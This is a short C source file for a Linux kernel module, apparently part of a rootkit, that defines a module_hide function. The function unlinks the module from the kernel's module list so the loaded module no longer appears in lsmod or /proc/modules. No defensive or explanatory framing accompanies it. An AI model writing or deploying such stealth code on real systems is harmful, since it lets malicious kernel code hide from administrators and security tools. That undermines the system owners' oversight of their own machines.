#include <linux/unistd.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>

#include "hiding.h"

void module_hide()
{
	list_del(&THIS_MODULE->list);
}
